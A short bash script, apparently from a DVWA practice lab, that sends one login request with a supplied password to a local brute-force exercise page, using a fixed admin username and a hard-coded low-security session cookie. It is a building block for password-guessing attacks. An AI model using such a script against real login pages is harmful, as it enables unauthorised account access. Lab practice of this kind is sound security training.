#!/bin/bash

if [ -z "$1" ]; then
  echo "Usage: $0 <name>"
  exit 1
fi

curl 'http://localhost/vulnerabilities/brute/?username=admin&password='$1'&Login=Login' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: PHPSESSID=a37a118136e3b406348c2d36415476c1; security=low' \
  -H 'Referer: http://localhost/vulnerabilities/brute/' 